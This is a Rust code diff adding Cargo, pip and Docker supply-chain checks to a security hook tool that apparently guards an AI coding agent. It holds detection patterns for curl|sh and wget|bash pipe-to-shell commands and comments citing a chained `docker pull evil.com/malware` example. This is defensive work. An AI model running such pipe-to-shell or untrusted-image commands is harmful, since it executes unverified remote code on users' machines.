@@ -89,16 +89,101 @@ pub fn default_go_trusted_prefixes() -> Vec<String> {
     ]
 }
 
+/// Rust/Cargo ecosystem configuration for hook behaviour.
+///
+/// Loaded from the `[sentinel.cargo]` section of the config file. When
+/// unavailable, all protections default to enabled.
+#[derive(Debug, Clone)]
+pub struct CargoConfig {
+    /// Crate names that skip slopsquatting checks (exact match).
+    pub allowlist: Vec<String>,
+    /// Warn when cargo downloads new crates (build.rs may execute).
+    pub warn_build_scripts: bool,
+}
+
+impl Default for CargoConfig {
+    fn default() -> Self {
+        Self {
+            allowlist: Vec::new(),
+            warn_build_scripts: true,
+        }
+    }
+}
+
+/// Python/pip ecosystem configuration for hook behaviour.
+///
+/// Loaded from the `[sentinel.pip]` section of the config file. When
+/// unavailable, all protections default to enabled.
+#[derive(Debug, Clone)]
+pub struct PipConfig {
+    /// Package names that skip slopsquatting checks (exact match).
+    pub allowlist: Vec<String>,
+    /// Warn when pip install runs without `--only-binary :all:`.
+    pub warn_source_installs: bool,
+    /// Block pip install commands without `--only-binary :all:`.
+    pub require_binary_only: bool,
+}
+
+impl Default for PipConfig {
+    fn default() -> Self {
+        Self {
+            allowlist: Vec::new(),
+            warn_source_installs: true,
+            require_binary_only: false,
+        }
+    }
+}
+
+/// Docker image safety configuration for hook behaviour.
+///
+/// Loaded from the `[ai_firewall.docker]` section of the config file.
+/// When unavailable, all protections default to enabled with standard
+/// trusted registries.
+#[derive(Debug, Clone)]
+pub struct DockerConfig {
+    /// Docker registries considered trusted.
+    pub trusted_registries: Vec<String>,
+    /// Warn on `:latest` or untagged images.
+    pub warn_latest: bool,
+    /// Warn on `ADD` with remote URLs in Dockerfiles.
+    pub warn_remote_add: bool,
+    /// Warn on `curl|sh` / `wget|bash` patterns in Dockerfile `RUN`.
+    pub warn_pipe_install: bool,
+}
+
+impl Default for DockerConfig {
+    fn default() -> Self {
+        Self {
+            trusted_registries: vec![
+                "docker.io".to_owned(),
+                "ghcr.io".to_owned(),
+                "gcr.io".to_owned(),
+                "public.ecr.aws".to_owned(),
+                "registry.k8s.io".to_owned(),
+            ],
+            warn_latest: true,
+            warn_remote_add: true,
+            warn_pipe_install: true,
+        }
+    }
+}
+
 /// Bundle of per-ecosystem package manager configurations.
 ///
 /// Passed to hook handlers to control allowlisting and ecosystem-specific
-/// behaviour. New ecosystems (Cargo, Docker) add fields here in v0.4.0.
+/// behaviour.
 #[derive(Debug, Clone, Default)]
 pub struct PackageManagerConfigs {
     /// npm/JS package manager configuration.
     pub npm: NpmConfig,
     /// Go module ecosystem configuration.
     pub go: GoConfig,
+    /// Rust/Cargo ecosystem configuration.
+    pub cargo: CargoConfig,
+    /// Python/pip ecosystem configuration.
+    pub pip: PipConfig,
+    /// Docker image safety configuration.
+    pub docker: DockerConfig,
 }
 
 /// Result of checking whether a package exists on a registry.
@@ -118,6 +203,7 @@ pub enum Registry {
     Npm,
     PyPI,
     Go,
+    CratesIo,
 }
 
 impl std::fmt::Display for Registry {
@@ -126,6 +212,7 @@ impl std::fmt::Display for Registry {
             Self::Npm => write!(f, "npm"),
             Self::PyPI => write!(f, "PyPI"),
             Self::Go => write!(f, "Go"),
+            Self::CratesIo => write!(f, "crates.io"),
         }
     }
 }
@@ -385,6 +472,14 @@ fn extract_packages_from_fragment(fragment: &str) -> Vec<(String, Registry)> {
         }
     }
 
+    // cargo add / cargo install patterns
+    let cargo_prefixes: &[&str] = &["cargo add ", "cargo install "];
+    for prefix in cargo_prefixes {
+        if let Some(rest) = trimmed.strip_prefix(prefix) {
+            return parse_cargo_args(rest);
+        }
+    }
+
     Vec::new()
 }
 
@@ -472,6 +567,8 @@ fn parse_package_args(args: &str, registry: &Registry) -> Vec<(String, Registry)
                 "--constraint",
                 "--requirement",
                 "--find-links",
+                "-e",
+                "--editable",
             ];
             if value_flags.contains(&token) {
                 skip_next = true;
@@ -565,6 +662,66 @@ fn parse_go_module_args(args: &str) -> Vec<(String, Registry)> {
     modules
 }
 
+/// Parse crate names from `cargo add` or `cargo install` arguments.
+///
+/// Skips flags and their value arguments. Strips version pinning
+/// (`serde@1.0.210` → `serde`). Skips path-like tokens and `--git`/`--path`
+/// sources (those reference local or git sources, not crates.io).
+fn parse_cargo_args(args: &str) -> Vec<(String, Registry)> {
+    // Flags that consume the next whitespace-separated token as a value.
+    const VALUE_FLAGS: &[&str] = &[
+        "--features",
+        "-F",
+        "--registry",
+        "--version",
+        "--branch",
+        "--tag",
+        "--rev",
+        "--path",
+        "--git",
+        "--target-dir",
+        "--root",
+        "--index",
+        "--rename",
+    ];
+
+    let mut crates = Vec::new();
+    let mut skip_next = false;
+
+    for token in args.split_whitespace() {
+        if skip_next {
+            skip_next = false;
+            continue;
+        }
+
+        // Skip flags; consume following value for flags that take one.
+        if token.starts_with('-') {
+            // Handle --flag=value (no next-token consumption needed)
+            if token.contains('=') {
+                continue;
+            }
+            if VALUE_FLAGS.contains(&token) {
+                skip_next = true;
+            }
+            continue;
+        }
+
+        // Skip path-like tokens (local source, not a crate name)
+        if token.contains('/') || token.starts_with('.') {
+            continue;
+        }
+
+        // Strip version pin: serde@1.0.210 -> serde
+        let name = token.find('@').map_or(token, |at| &token[..at]);
+
+        if is_valid_crate_name(name) {
+            crates.push((name.to_owned(), Registry::CratesIo));
+        }
+    }
+
+    crates
+}
+
 /// Validate that a string looks like a Go module path.
 ///
 /// Go module paths must start with a domain (contain a `.` in the first
@@ -611,6 +768,42 @@ fn go_module_case_encode(module: &str) -> String {
     encoded
 }
 
+/// Compute the sparse index URL path for a crate name.
+///
+/// Crate names are case-insensitive on crates.io; we lowercase for the
+/// index lookup. Path structure per RFC 2789:
+/// - 1 char:  `1/{name}`
+/// - 2 chars: `2/{name}`
+/// - 3 chars: `3/{first_char}/{name}`
+/// - 4+ chars: `{first_two}/{next_two}/{name}`
+fn crate_sparse_index_path(name: &str) -> String {
+    let lower = name.to_ascii_lowercase();
+    match lower.len() {
+        0 => String::new(), // validated before call
+        1 => format!("1/{lower}"),
+        2 => format!("2/{lower}"),
+        3 => format!("3/{}/{lower}", &lower[..1]),
+        _ => format!("{}/{}/{lower}", &lower[..2], &lower[2..4]),
+    }
+}
+
+/// Validate that a string is a valid Cargo crate name.
+///
+/// Crate names on crates.io: 1-64 ASCII chars, alphanumeric plus `-` and `_`.
+/// Must start with an ASCII letter. Hyphens and underscores are interchangeable
+/// for lookup purposes (but we validate the raw name as given).
+fn is_valid_crate_name(name: &str) -> bool {
+    if name.is_empty() || name.len() > 64 {
+        return false;
+    }
+    let first = name.as_bytes()[0];
+    if !first.is_ascii_alphabetic() {
+        return false;
+    }
+    name.bytes()
+        .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
+}
+
 /// Check whether a package exists on its registry using a synchronous HTTP
 /// HEAD request via `curl`.
 ///
@@ -629,9 +822,19 @@ fn check_package_exists_with_timeout(
     registry: &Registry,
     timeout_secs: u64,
 ) -> PackageCheckResult {
-    // Validate package name before URL construction to prevent injection
-    if !is_valid_curl_package_name(name) {
-        return PackageCheckResult::CheckFailed(format!("invalid package name: {name}"));
+    // Validate package name before URL construction to prevent injection.
+    // CratesIo uses its own validator; others share is_valid_curl_package_name.
+    match registry {
+        Registry::CratesIo => {
+            if !is_valid_crate_name(name) {
+                return PackageCheckResult::CheckFailed(format!("invalid crate name: {name}"));
+            }
+        }
+        _ => {
+            if !is_valid_curl_package_name(name) {
+                return PackageCheckResult::CheckFailed(format!("invalid package name: {name}"));
+            }
+        }
     }
 
     let url = match registry {
@@ -640,6 +843,11 @@ fn check_package_exists_with_timeout(
         Registry::Go => {
             let encoded = go_module_case_encode(name);
             format!("https://proxy.golang.org/{encoded}/@latest")
+        }
+        Registry::CratesIo => {
+            // Use sparse index: no rate limits, no User-Agent requirement, CDN-backed.
+            let path = crate_sparse_index_path(name);
+            format!("https://index.crates.io/{path}")
         }
     };
 
@@ -668,7 +876,8 @@ fn check_package_exists_with_timeout(
             let code = code.trim();
             match code {
                 "200" => PackageCheckResult::Exists,
-                "404" | "410" => PackageCheckResult::NotFound,
+                // 404 = not found, 410 = gone/retracted, 451 = legal removal (crates.io)
+                "404" | "410" | "451" => PackageCheckResult::NotFound,
                 _ => PackageCheckResult::CheckFailed(format!("registry returned HTTP {code}")),
             }
         }
@@ -1671,6 +1880,195 @@ fn is_go_install_command(command: &str) -> bool {
     })
 }
 
+/// Cargo add/install command patterns.
+const CARGO_ADD_INSTALL_PATTERNS: &[&str] = &["cargo add ", "cargo install "];
+
+/// Return `true` if any sub-command matches a Cargo add/install pattern.
+fn is_cargo_add_or_install_command(command: &str) -> bool {
+    split_shell_commands(command).iter().any(|frag| {
+        let normalised = frag.replace('\t', " ");
+        let trimmed = normalised.trim();
+        CARGO_ADD_INSTALL_PATTERNS
+            .iter()
+            .any(|pat| trimmed.starts_with(pat) || trimmed == pat.trim_end())
+    })
+}
+
+/// Docker/Podman command patterns that may pull or run images.
+const DOCKER_COMMAND_PATTERNS: &[&str] = &[
+    "docker pull ",
+    "docker run ",
+    "docker create ",
+    "docker build ",
+    "docker compose up",
+    "docker compose build",
+    "docker-compose up",
+    "docker-compose build",
+    "podman pull ",
+    "podman run ",
+    "podman create ",
+    "podman build ",
+];
+
+/// Return `true` if any sub-command matches a Docker/Podman command pattern.
+fn is_docker_command(command: &str) -> bool {
+    split_shell_commands(command).iter().any(|frag| {
+        let normalised = frag.replace('\t', " ");
+        let trimmed = normalised.trim();
+        DOCKER_COMMAND_PATTERNS
+            .iter()
+            .any(|pat| trimmed.starts_with(pat) || trimmed == pat.trim_end())
+    })
+}
+
+/// Extract Docker image references from a command string.
+///
+/// Handles `docker pull <image>`, `docker run [flags] <image>`,
+/// `podman pull <image>`, `podman run [flags] <image>`.
+/// Does NOT extract from `docker build` (builds local, no remote image).
+fn extract_docker_images(command: &str) -> Vec<String> {
+    let mut images = Vec::new();
+    for fragment in split_shell_commands(command) {
+        let normalised = fragment.replace('\t', " ");
+        let trimmed = normalised.trim();
+
+        // docker/podman pull <image>
+        let pull_rest = trimmed
+            .strip_prefix("docker pull ")
+            .or_else(|| trimmed.strip_prefix("podman pull "));
+        if let Some(rest) = pull_rest {
+            // The image is typically the last non-flag token
+            for token in rest.split_whitespace().rev() {
+                if !token.starts_with('-') {
+                    images.push(token.to_owned());
+                    break;
+                }
+            }
+            continue;
+        }
+
+        // docker/podman run|create [flags] <image> [cmd]
+        let run_rest = trimmed
+            .strip_prefix("docker run ")
+            .or_else(|| trimmed.strip_prefix("docker create "))
+            .or_else(|| trimmed.strip_prefix("podman run "))
+            .or_else(|| trimmed.strip_prefix("podman create "));
+        if let Some(rest) = run_rest {
+            if let Some(img) = extract_docker_run_image(rest) {
+                images.push(img);
+            }
+        }
+    }
+    images
+}
+
+/// Extract the image reference from `docker run` arguments.
+///
+/// Skips flags and their values. The first positional argument is the image.
+fn extract_docker_run_image(args: &str) -> Option<String> {
+    // Flags that consume the next token as a value.
+    const VALUE_FLAGS: &[&str] = &[
+        "-e",
+        "--env",
+        "-v",
+        "--volume",
+        "-p",
+        "--publish",
+        "-w",
+        "--workdir",
+        "--name",
+        "--network",
+        "--entrypoint",
+        "-u",
+        "--user",
+        "--mount",
+        "-l",
+        "--label",
+        "--platform",
+        "--pull",
+        "--restart",
+        "--memory",
+        "--cpus",
+        "--hostname",
+        "-h",
+        "--ip",
+        "--dns",
+        "--add-host",
+        "--log-driver",
+        "--log-opt",
+        "--pid",
+        "--userns",
+        "--cgroupns",
+        "--device",
+        "--cap-add",
+        "--cap-drop",
+        "--security-opt",
+        "--env-file",
+        "--cidfile",
+        "--runtime",
+        "--shm-size",
+        "--stop-signal",
+        "--stop-timeout",
+        "--tmpfs",
+        "--ulimit",
+        "--ipc",
+        "--uts",
+        "--cgroup-parent",
+    ];
+
+    let mut skip_next = false;
+
+    for token in args.split_whitespace() {
+        if skip_next {
+            skip_next = false;
+            continue;
+        }
+
+        if token.starts_with('-') {
+            // Handle --flag=value (no next-token consumption)
+            if token.contains('=') {
+                continue;
+            }
+            // Check if this flag consumes the next token
+            if VALUE_FLAGS.contains(&token) {
+                skip_next = true;
+            }
+            // Boolean flags like --rm, -it, -d, --privileged don't consume next
+            continue;
+        }
+
+        // First positional arg is the image
+        return Some(token.to_owned());
+    }
+    None
+}
+
+/// Extract the registry hostname from a Docker image reference.
+///
+/// - `"ubuntu"` → `"docker.io"` (implicit Docker Hub)
+/// - `"ghcr.io/owner/repo:v1"` → `"ghcr.io"`
+/// - `"registry.example.com:5000/image"` → `"registry.example.com:5000"`
+/// - `"library/nginx"` → `"docker.io"` (Docker Hub library)
+fn extract_docker_registry(image: &str) -> String {
+    // Strip digest (@sha256:...) first
+    let without_digest = image.split('@').next().unwrap_or(image);
+
+    // If no slash, it's a bare Docker Hub image (e.g., "ubuntu", "ubuntu:22.04")
+    let Some(first_slash) = without_digest.find('/') else {
+        return "docker.io".to_owned();
+    };
+
+    // Everything before the first slash is a potential registry.
+    // It's a registry if it contains a dot (ghcr.io) or a colon (localhost:5000).
+    let first_segment = &without_digest[..first_slash];
+    if first_segment.contains('.') || first_segment.contains(':') {
+        return first_segment.to_owned();
+    }
+
+    // Otherwise it's a Docker Hub user namespace (e.g., "library/nginx")
+    "docker.io".to_owned()
+}
+
 /// Evaluate a pre-bash hook.
 ///
 /// - **BLOCK**: Reading credential files (via direct or indirect commands,
@@ -1691,7 +2089,7 @@ pub fn pre_bash(input: &HookInput) -> HookOutput {
 pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> HookOutput {
     let configs = PackageManagerConfigs {
         npm: npm_config.clone(),
-        go: GoConfig::default(),
+        ..PackageManagerConfigs::default()
     };
     pre_bash_with_configs(input, &configs)
 }
@@ -1834,6 +2232,7 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
     let is_npm_install = is_npm_install_command(command);
     let is_pip_install = is_pip_install_command(command);
     let is_go_install = is_go_install_command(command);
+    let is_cargo_add_install = is_cargo_add_or_install_command(command);
 
     // Read package existence check config: default to enabled with 5s timeout
     let check_pkg_existence = input
@@ -1845,14 +2244,21 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
         (cfg.package_check_timeout_ms / 1000).max(1)
     });
 
-    if is_npm_install || is_pip_install || is_go_install {
+    // Accumulates warnings across package manager + Docker checks so that
+    // chained commands (e.g. `pip install foo && docker pull evil`) evaluate
+    // all stages before returning.
+    #[allow(clippy::useless_let_if_seq)]
+    let mut pkg_warnings: Vec<String> = Vec::new();
+
+    if is_npm_install || is_pip_install || is_go_install || is_cargo_add_install {
         let packages = extract_all_packages(command);
         let mut warnings: Vec<String> = Vec::new();
 
         for (name, registry) in &packages {
             // Skip allowlisted packages (per-registry allowlist)
             let is_allowlisted = match registry {
-                Registry::Npm | Registry::PyPI => npm_config.allowlist.iter().any(|a| a == name),
+                Registry::Npm => npm_config.allowlist.iter().any(|a| a == name),
+                Registry::PyPI => configs.pip.allowlist.iter().any(|a| a == name),
                 Registry::Go => {
                     go_config.allowlist.iter().any(|a| a == name)
                         || go_config
@@ -1860,6 +2266,7 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
                             .iter()
                             .any(|prefix| name.starts_with(prefix.as_str()))
                 }
+                Registry::CratesIo => configs.cargo.allowlist.iter().any(|a| a == name),
             };
             if is_allowlisted {
                 continue;
@@ -1881,20 +2288,26 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
                         Registry::Go => format!(
                             "Blocked: module '{name}' not found on Go \
                              (possible typosquatting/slopsquatting)\n\
-                             To proceed: verify at pkg.go.dev/{name}, add to \
+                             To proceed: verify at https://pkg.go.dev/{name}, add to \
                              [sentinel.go] allowlist, or run directly in your terminal"
                         ),
-                        _ => format!(
-                            "Blocked: package '{name}' not found on {registry} \
+                        Registry::CratesIo => format!(
+                            "Blocked: crate '{name}' not found on crates.io \
                              (possible typosquatting/slopsquatting)\n\
-                             To proceed: verify package at {} and run directly in your terminal",
-                            match registry {
-                                Registry::Npm => format!("npmjs.com/package/{name}"),
-                                Registry::PyPI => format!("pypi.org/project/{name}"),
-                                // Go is handled above; this arm is unreachable
-                                // but required for exhaustive matching.
-                                Registry::Go => format!("pkg.go.dev/{name}"),
-                            }
+                             To proceed: verify at https://crates.io/crates/{name}, add to \
+                             [sentinel.cargo] allowlist, or run directly in your terminal"
+                        ),
+                        Registry::Npm => format!(
+                            "Blocked: package '{name}' not found on npm \
+                             (possible typosquatting/slopsquatting)\n\
+                             To proceed: verify at https://www.npmjs.com/package/{name}, add to \
+                             [sentinel.npm] allowlist, or run directly in your terminal"
+                        ),
+                        Registry::PyPI => format!(
+                            "Blocked: package '{name}' not found on PyPI \
+                             (possible typosquatting/slopsquatting)\n\
+                             To proceed: verify at https://pypi.org/project/{name}, add to \
+                             [sentinel.pip] allowlist, or run directly in your terminal"
                         ),
                     };
                     return HookOutput::block(msg);
@@ -1924,6 +2337,22 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
             );
         }
 
+        // Block pip install without --only-binary when required by policy.
+        // setup.py in source distributions executes arbitrary code (like npm postinstall).
+        if is_pip_install
+            && configs.pip.require_binary_only
+            && !normalised.contains("--only-binary :all:")
+            && !normalised.contains("--only-binary=:all:")
+        {
+            return HookOutput::block(
+                "Blocked: pip install without --only-binary :all: allows setup.py code execution \
+                 (source distributions can run arbitrary code during install, similar to npm postinstall scripts)\n\
+                 To proceed: add --only-binary :all: to the command, or disable \
+                 require_binary_only in your Sanctum config [sentinel.pip]"
+                    .to_owned(),
+            );
+        }
+
         // If we got here with no packages extracted, it might be a bare install
         // from lockfile (e.g., `npm install`, `pip install .`), or packages
         // were all allowlisted. Just check for ignore-scripts suggestion.
@@ -1938,15 +2367,72 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
             );
         }
 
-        if !warnings.is_empty() {
-            return HookOutput::warn(warnings.join("\n"));
+        // Warn about pip source install risk.
+        if is_pip_install
+            && configs.pip.warn_source_installs
+            && !normalised.contains("--only-binary :all:")
+            && !normalised.contains("--only-binary=:all:")
+            && !packages.is_empty()
+        {
+            warnings.push(
+                "Tip: consider --only-binary :all: to prevent setup.py execution during install. \
+                 Source distributions can execute arbitrary code (like npm postinstall scripts)."
+                    .to_owned(),
+            );
         }
 
-        // M16: If all packages were verified or this is a bare install,
-        // proceed without the generic pip install warning.
-        if !packages.is_empty() {
-            return HookOutput::allow();
+        // Collect package manager warnings but do NOT return yet — fall through
+        // to Docker checks so chained commands like
+        // `pip install foo && docker pull evil.com/malware` are fully evaluated.
+        pkg_warnings = warnings;
+    }
+
+    // --- Docker image safety checks ---
+    let docker_config = &configs.docker;
+    if is_docker_command(command) {
+        let images = extract_docker_images(command);
+
+        for image in &images {
+            // Warn on :latest or untagged images
+            if docker_config.warn_latest {
+                // Check for tag/digest in the image name portion (after last /).
+                // A colon in the registry (e.g., "localhost:5000/img") is NOT a tag.
+                let image_name = image.rsplit('/').next().unwrap_or(image);
+                let has_pin = image_name.contains(':') || image.contains('@');
+                let is_latest = image.ends_with(":latest");
+                if !has_pin || is_latest {
+                    let reason = if is_latest {
+                        ":latest"
+                    } else {
+                        "no tag (defaults to :latest)"
+                    };
+                    pkg_warnings.push(format!(
+                        "Warning: Docker image '{image}' uses {reason} \u{2014} consider pinning to a \
+                         specific tag or digest (@sha256:...) for reproducibility and supply chain safety"
+                    ));
+                }
+            }
+
+            // Warn on untrusted registries
+            if !docker_config.trusted_registries.is_empty() {
+                let registry = extract_docker_registry(image);
+                if !docker_config
+                    .trusted_registries
+                    .iter()
+                    .any(|r| r == &registry)
+                {
+                    pkg_warnings.push(format!(
+                        "Warning: Docker image '{image}' is from registry '{registry}' \
+                         which is not in your trusted_registries list [ai_firewall.docker]"
+                    ));
+                }
+            }
         }
+    }
+
+    // Return combined warnings from package manager + Docker checks.
+    if !pkg_warnings.is_empty() {
+        return HookOutput::warn(pkg_warnings.join("\n"));
     }
 
     // Warn on curl POST (potential data exfiltration)
@@ -2072,12 +2558,40 @@ fn collect_credential_types(
     }
 }
 
+/// Join Dockerfile backslash-continuation lines into single logical lines.
+///
+/// Lines ending with `\` (as the last non-whitespace character) are merged
+/// with the following line, separated by a space. This ensures that
+/// multi-line `RUN` instructions are analysed as a single command.
+fn join_dockerfile_continuations(content: &str) -> String {
+    let mut result = String::with_capacity(content.len());
+    let mut continuation = String::new();
+    for line in content.lines() {
+        let trimmed_end = line.trim_end();
+        if let Some(stripped) = trimmed_end.strip_suffix('\\') {
+            // Continuation: append without the trailing backslash
+            continuation.push_str(stripped);
+            continuation.push(' ');
+        } else {
+            continuation.push_str(line);
+            result.push_str(&continuation);
+            result.push('\n');
+            continuation.clear();
+        }
+    }
+    if !continuation.is_empty() {
+        result.push_str(&continuation);
+    }
+    result
+}
+
 /// Evaluate a pre-write hook.
 ///
 /// - **BLOCK**: Writing `.pth` files, `sitecustomize.py`, or `usercustomize.py` (supply chain attack vectors);
 ///   writing content that contains detected credentials.
 /// - **ALLOW**: Everything else.
 #[must_use]
+#[allow(clippy::too_many_lines)]
 pub fn pre_write(input: &HookInput) -> HookOutput {
     if let Some(ref cfg) = input.config {
         if !cfg.claude_hooks {
@@ -2136,6 +2650,94 @@ pub fn pre_write(input: &HookInput) -> HookOutput {
                  To proceed: verify and run this command directly in your terminal (outside Claude Code)",
                 credential_types.join(", ")
             ));
+        }
+    }
+
+    // Dockerfile safety checks (when writing Dockerfile or docker-compose files).
+    // Warns on supply chain risks: unpinned FROM images, remote ADD URLs,
+    // and curl|sh pipe-to-shell patterns in RUN instructions.
+    let is_dockerfile = file_path_lower.ends_with("dockerfile")
+        || file_path_lower.contains("dockerfile.")
+        || file_path_lower.ends_with("docker-compose.yml")
+        || file_path_lower.ends_with("docker-compose.yaml")
+        || file_path_lower.ends_with("compose.yml")
+        || file_path_lower.ends_with("compose.yaml");
+
+    if is_dockerfile {
+        // Read Docker config from the firewall config if available;
+        // fall back to defaults (all warnings enabled).
+        let docker_cfg = input
+            .config
+            .as_ref()
+            .map(|c| &c.docker)
+            .cloned()
+            .unwrap_or_default();
+
+        let content = input
+            .tool_input
+            .get("content")
+            .or_else(|| input.tool_input.get("new_string"))
+            .and_then(serde_json::Value::as_str)
+            .unwrap_or("");
+        let mut docker_warnings = Vec::new();
+
+        // Join backslash-continuation lines before scanning so that
+        // multi-line RUN instructions (e.g. `curl ... \\\n  | sh`) are
+        // detected as a single logical line.
+        let joined_content = join_dockerfile_continuations(content);
+        for line in joined_content.lines() {
+            let trimmed = line.trim();
+            let upper = trimmed.to_uppercase();
+
+            // FROM with :latest or no tag
+            if docker_cfg.warn_latest && upper.starts_with("FROM ") {
+                let image_part = trimmed[5..].split_whitespace().next().unwrap_or("");
+                if !image_part.is_empty() && image_part != "scratch" {
+                    let has_pin = (image_part.contains(':') && !image_part.ends_with(":latest"))
+                        || image_part.contains('@');
+                    if !has_pin {
+                        docker_warnings.push(format!(
+                            "Dockerfile FROM '{image_part}' is not pinned \u{2014} consider using \
+                             a specific tag or digest for supply chain safety"
+                        ));
+                    }
+                }
+            }
+
+            // ADD with remote URL
+            if docker_cfg.warn_remote_add
+                && upper.starts_with("ADD ")
+                && (trimmed.contains("http://") || trimmed.contains("https://"))
+            {
+                docker_warnings.push(
+                    "Dockerfile ADD with remote URL detected \u{2014} consider using COPY + \
+                     explicit download step for auditability"
+                        .to_owned(),
+                );
+            }
+
+            // RUN with pipe-to-shell (curl|sh, wget|bash) — case-insensitive
+            if docker_cfg.warn_pipe_install && upper.starts_with("RUN ") {
+                let run_body_lower = trimmed[4..].to_lowercase();
+                if (run_body_lower.contains("curl") || run_body_lower.contains("wget"))
+                    && (run_body_lower.contains("| sh")
+                        || run_body_lower.contains("| bash")
+                        || run_body_lower.contains("|sh")
+                        || run_body_lower.contains("|bash")
+                        || run_body_lower.contains("| /bin/sh")
+                        || run_body_lower.contains("| /bin/bash"))
+                {
+                    docker_warnings.push(
+                        "Dockerfile RUN pipes remote content to shell (curl|sh pattern) \u{2014} \
+                         consider downloading, verifying checksum, then executing"
+                            .to_owned(),
+                    );
+                }
+            }
+        }
+
+        if !docker_warnings.is_empty() {
+            return HookOutput::warn(docker_warnings.join("\n"));
         }
     }
 
@@ -2495,12 +3097,100 @@ pub fn post_bash(input: &HookInput) -> HookOutput {
 
 /// Post-bash handler that accepts the full package manager config bundle.
 ///
-/// Currently delegates to [`post_bash_with_npm_config`] (no Go-specific
-/// logic in Phase 1). Signature exists for forward compatibility with
-/// Go `init()` monitoring in Phase 2.
+/// Extends the npm-specific handler with cargo download detection.
+/// Post-hooks are informational only — they warn but never block.
 #[must_use]
 pub fn post_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs) -> HookOutput {
-    post_bash_with_npm_config(input, &configs.npm)
+    const CARGO_BUILD_COMMANDS: &[&str] = &[
+        "cargo build",
+        "cargo run",
+        "cargo test",
+        "cargo bench",
+        "cargo check",
+        "cargo install",
+        "cargo add",
+        "cargo clippy",
+    ];
+
+    // Get the base output from the npm handler
+    let base = post_bash_with_npm_config(input, &configs.npm);
+
+    // If hooks are disabled, return early
+    if let Some(ref cfg) = input.config {
+        if !cfg.claude_hooks {
+            return base;
+        }
+    }
+
+    // Cargo download detection (build.rs/proc-macro warning)
+    let cargo_config = &configs.cargo;
+    if cargo_config.warn_build_scripts {
+        let command = input
+            .tool_input
+            .get("command")
+            .and_then(serde_json::Value::as_str)
+            .unwrap_or("");
+        let stdout = input
+            .tool_input
+            .get("stdout")
+            .and_then(serde_json::Value::as_str)
+            .unwrap_or("");
+        let stderr = input
+            .tool_input
+            .get("stderr")
+            .and_then(serde_json::Value::as_str)
+            .unwrap_or("");
+        let combined_output = format!("{stdout}\n{stderr}");
+
+        let is_cargo_command = CARGO_BUILD_COMMANDS.iter().any(|cmd| command.contains(cmd));
+
+        if is_cargo_command {
+            let downloaded: Vec<&str> = combined_output
+                .lines()
+                .filter_map(|line| {
+                    let trimmed = line.trim();
+                    trimmed.strip_prefix("Downloaded ").and_then(|rest| {
+                        let name = rest.split_whitespace().next()?;
+                        // Skip summary lines like "Downloaded 14 crates (2.3 MB) in 1.22s"
+                        if name.chars().next().is_some_and(|c| c.is_ascii_digit()) {
+                            return None;
+                        }
+                        Some(name)
+                    })
+                })
+                .filter(|name| !cargo_config.allowlist.iter().any(|a| a == name))
+                .collect();
+
+            if !downloaded.is_empty() {
+                let crate_list = downloaded.join(", ");
+                let audit_hint = if downloaded.len() == 1 {
+                    format!(
+                        "To audit: check at https://crates.io/crates/{}",
+                        downloaded[0]
+                    )
+                } else {
+                    "To audit: check at https://crates.io/crates/<name>".to_owned()
+                };
+                let cargo_warning = format!(
+                    "Cargo downloaded new crates: {crate_list}. \
+                     These may contain build.rs scripts that execute arbitrary code at compile time. \
+                     To suppress: add trusted crates to [sentinel.cargo] allowlist. \
+                     {audit_hint}"
+                );
+
+                // Merge with existing warnings from npm handler
+                return match base.decision {
+                    HookDecision::Warn => {
+                        let existing = base.message.unwrap_or_default();
+                        HookOutput::warn(format!("{existing}\n{cargo_warning}"))
+                    }
+                    _ => HookOutput::warn(cargo_warning),
+                };
+            }
+        }
+    }
+
+    base
 }
 
 /// Scan stdout/stderr for credential values and push warnings.
@@ -7291,10 +7981,10 @@ mod expanded_claude_tests {
         let name = "github.com/fake/module";
         let registry = Registry::Go;
         let url = match registry {
-            Registry::Go => format!("pkg.go.dev/{name}"),
+            Registry::Go => format!("https://pkg.go.dev/{name}"),
             _ => String::new(),
         };
-        assert!(url.contains("pkg.go.dev/github.com/fake/module"));
+        assert!(url.contains("https://pkg.go.dev/github.com/fake/module"));
     }
 
     // -- split_shell_commands --
@@ -7558,5 +8248,1111 @@ mod expanded_claude_tests {
         assert!(!is_pip_install_command("pip show requests"));
         assert!(!is_go_install_command("go build ./..."));
         assert!(!is_go_install_command("go mod tidy"));
+        assert!(!is_cargo_add_or_install_command("cargo build"));
+        assert!(!is_cargo_add_or_install_command("cargo test"));
+    }
+
+    // --- Cargo sparse index path tests ---
+
+    #[test]
+    fn sparse_index_path_1char() {
+        assert_eq!(crate_sparse_index_path("a"), "1/a");
+    }
+
+    #[test]
+    fn sparse_index_path_2char() {
+        assert_eq!(crate_sparse_index_path("cc"), "2/cc");
+    }
+
+    #[test]
+    fn sparse_index_path_3char() {
+        assert_eq!(crate_sparse_index_path("syn"), "3/s/syn");
+    }
+
+    #[test]
+    fn sparse_index_path_4plus_char() {
+        assert_eq!(crate_sparse_index_path("serde"), "se/rd/serde");
+    }
+
+    #[test]
+    fn sparse_index_path_uppercase_normalized() {
+        assert_eq!(crate_sparse_index_path("Tokio"), "to/ki/tokio");
+    }
+
+    // --- Crate name validation tests ---
+
+    #[test]
+    fn valid_crate_name_simple() {
+        assert!(is_valid_crate_name("serde"));
+    }
+
+    #[test]
+    fn valid_crate_name_with_hyphen() {
+        assert!(is_valid_crate_name("serde-json"));
+    }
+
+    #[test]
+    fn valid_crate_name_with_underscore() {
+        assert!(is_valid_crate_name("serde_json"));
+    }
+
+    #[test]
+    fn invalid_crate_name_empty() {
+        assert!(!is_valid_crate_name(""));
+    }
+
+    #[test]
+    fn invalid_crate_name_starts_with_number() {
+        assert!(!is_valid_crate_name("123abc"));
+    }
+
+    #[test]
+    fn invalid_crate_name_too_long() {
+        let long_name = "a".repeat(65);
+        assert!(!is_valid_crate_name(&long_name));
+    }
+
+    #[test]
+    fn invalid_crate_name_special_chars() {
+        assert!(!is_valid_crate_name("foo.bar"));
+        assert!(!is_valid_crate_name("foo@bar"));
